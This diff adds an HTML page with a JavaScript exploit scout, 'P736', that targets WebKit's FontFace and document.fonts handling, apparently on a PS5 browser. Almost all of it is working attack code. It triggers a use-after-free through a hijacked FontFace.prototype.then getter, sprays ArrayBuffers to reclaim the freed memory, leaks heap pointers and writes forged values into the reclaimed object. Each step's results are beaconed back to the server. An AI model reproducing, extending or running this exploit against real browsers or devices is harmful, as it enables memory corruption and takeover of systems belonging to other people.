@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P736 — Active Pending Boolean Oracle & Wrapper Capture Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P736 — Active Pending Boolean Oracle & Wrapper Capture Scout
+ *
+ * Objectives:
+ * 1. Active Pending Boolean Oracle via hang.php:
+ *    - In P735, a dummy .woff returned 404, transitioning status to 'error'.
+ *    - In P736, we connect to /hang.php (HTTP 200 chunked stream with 15s hold).
+ *    - Status transitions to 'loading' without failure.
+ *    - Validates document.fonts.check() Boolean Comparator on live PS5:
+ *        inA ('A'=0x41) -> FALSE (font needed, loading)
+ *        inB ('B'=0x42) -> FALSE (font needed, loading)
+ *        outD ('D'=0x44)-> TRUE  (font outside range, not needed)
+ *        outZ ('Z'=0x5A)-> TRUE  (font outside range, not needed)
+ * 2. Pre-Removal Wrapper Capture:
+ *    - Query document.fonts before stTr.remove() to capture stFace (the JS FontFace
+ *      wrapper created by WebKit for trFam).
+ *    - Inspect stFace after reclaim to check if it binds directly to VIEW_B.
+ * 3. Load Promise Resolution Capture:
+ *    - Attach .then() to document.fonts.load('1em trFace, trFam', 'GH')
+ *      to capture all FontFace objects returned by WebKit.
+ * 4. Full 24-Quadword Inspection & m_ranges Poisoning:
+ *    - Dump VIEW_B before and after poisoning.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P736-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, ST_FACE = null, BUF_B = null, VIEW_B = null;
+var LOADED_FACES = [];
+
+function run(){
+  b('BOOT','p736-active-oracle-scout');
+  log('=== P736 Active Boolean Oracle & Wrapper Scout ===\n');
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Deterministic Reclaim */
+    log('[Step 2] Executing deterministic reclaim...');
+    doReclaim(function(){
+      /* Step 3: Run Active Oracle & Wrapper Diagnostics */
+      log('\n[Step 3] Running diagnostics & oracle verification...');
+      runDiagnostics();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+
+  if(v[11] >= LOW && v[11] < HIGH) P58 = v[11];
+  if(v[13] >= LOW && v[13] < HIGH) P68 = v[13];
+
+  if(!P58 || !P68){
+    for(var q=0; q<24; q++){
+      var val = v[q];
+      if(val >= LOW && val < HIGH){
+        if(!P58) P58 = val;
+        else if(!P68 && val !== P58) P68 = val;
+      }
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Deterministic Reclaim & Wrapper Capture ---- */
+function doReclaim(cb){
+  b('REC-START', 'fill_q12_q6=0x' + h16(P58));
+
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+  document.body.offsetHeight;
+
+  /* Capture the stFace wrapper from document.fonts BEFORE removal! */
+  try {
+    document.fonts.forEach(function(f){
+      if(f.family && f.family.indexOf('trFam') !== -1) ST_FACE = f;
+    });
+  } catch(e){}
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stTr){ stTr.remove(); stTr.textContent = ''; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6]  = P58;
+        absW.push(ab);
+      }
+
+      try{ document.fonts.check('1em trFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  /* Capture returned FontFace objects from load promise */
+  try {
+    var pLoad = document.fonts.load('1em trFace, trFam', 'GH');
+    if(pLoad && pLoad.then){
+      pLoad.then(function(faces){
+        LOADED_FACES = faces || [];
+        var fNames = [];
+        for(var i=0; i<LOADED_FACES.length; i++) fNames.push(LOADED_FACES[i].family + ':' + LOADED_FACES[i].status);
+        b('LOAD-PROMISE-OK', 'count=' + LOADED_FACES.length + '|faces=' + fNames.join(','));
+      }).catch(function(e){
+        b('LOAD-PROMISE-REJ', e.message);
+      });
+    }
+  } catch(e){
+    b('LOAD-PROMISE-ERR', e.message);
+  }
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    b('RECLAIM-OK', 'baseK=' + best);
+    log('Deterministic Reclaim OK at slot ' + best);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Run Active Oracle & Wrapper Diagnostics ---- */
+function runDiagnostics(){
+  if(!VIEW_B) return;
+
+  /* 3A: Full 24-Quadword Dump */
+  var d0_11 = [], d12_23 = [];
+  for(var q=0; q<12; q++) d0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  for(var q=12; q<24; q++) d12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  b('DUMP-Q0-Q11', d0_11.join(';'));
+  b('DUMP-Q12-Q23', d12_23.join(';'));
+
+  /* 3B: Active Boolean Oracle Test via /hang.php */
+  try {
+    var actFace = new FontFace('actPendFam', 'url(/hang.php)', {unicodeRange: 'U+0041-U+0043'});
+    document.fonts.add(actFace);
+    actFace.load().catch(function(){});
+
+    var stBefore = actFace.status;
+    /* In-range characters: expect FALSE (needed & loading) */
+    var chA = document.fonts.check('1em actPendFam', 'A'); /* 0x41: IN RANGE */
+    var chB = document.fonts.check('1em actPendFam', 'B'); /* 0x42: IN RANGE */
+    var chC = document.fonts.check('1em actPendFam', 'C'); /* 0x43: IN RANGE */
+
+    /* Out-of-range characters: expect TRUE (not needed) */
+    var chD = document.fonts.check('1em actPendFam', 'D'); /* 0x44: OUT OF RANGE */
+    var chZ = document.fonts.check('1em actPendFam', 'Z'); /* 0x5A: OUT OF RANGE */
+
+    b('ACTIVE-ORACLE-RESULTS', 'status=' + stBefore + '|inA=' + chA + '|inB=' + chB + '|inC=' + chC + '|outD=' + chD + '|outZ=' + chZ);
+    log('Active Oracle: inA=' + chA + ' inB=' + chB + ' inC=' + chC + ' outD=' + chD + ' outZ=' + chZ);
+  } catch(e){
+    b('ACTIVE-ORACLE-ERR', e.message);
+  }
+
+  /* 3C: Inspect Captured ST_FACE */
+  var stProps = 'none';
+  if(ST_FACE){
+    var sStat = 'err', sFam = 'err', sRng = 'err';
+    try { sStat = ST_FACE.status; } catch(e){ sStat = e.message; }
+    try { sFam = ST_FACE.family; } catch(e){ sFam = e.message; }
+    try { sRng = ST_FACE.unicodeRange; } catch(e){ sRng = e.message; }
+    stProps = 'found|stat=' + sStat + '|fam=' + sFam + '|rng=' + sRng;
+  }
+  b('STFACE-INSPECT', stProps);
+
+  /* 3D: Poison m_ranges on VIEW_B and test ST_FACE & FACE_B */
+  /* Seed test range [0x41, 0x43] ('A' to 'C') at P58 */
+  VIEW_B[0] = 0x0000004300000041n;
+  VIEW_B[4] = P58;
+  VIEW_B[5] = 0x0000000100000001n;
+
+  var chStA = 'err', chStD = 'err';
+  if(ST_FACE){
+    try { chStA = document.fonts.check('1em ' + ST_FACE.family, 'A'); } catch(e){ chStA = e.message; }
+    try { chStD = document.fonts.check('1em ' + ST_FACE.family, 'D'); } catch(e){ chStD = e.message; }
+  }
+  b('STFACE-CHECK-POISON', 'chA=' + chStA + '|chD=' + chStD);
+
+  /* 3E: Test re-adding ST_FACE if detached */
+  var readdSt = 'none';
+  if(ST_FACE){
+    try {
+      document.fonts.add(ST_FACE);
+      readdSt = 'ok|has=' + document.fonts.has(ST_FACE);
+    } catch(e){
+      readdSt = 'err=' + e.message;
+    }
+  }
+  b('STFACE-READD', readdSt);
+
+  b('DONE', 'p736-complete');
+  log('\n=== P736 Complete! ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P736 — Active Boolean Oracle & Wrapper Scout running...</pre></body></html>
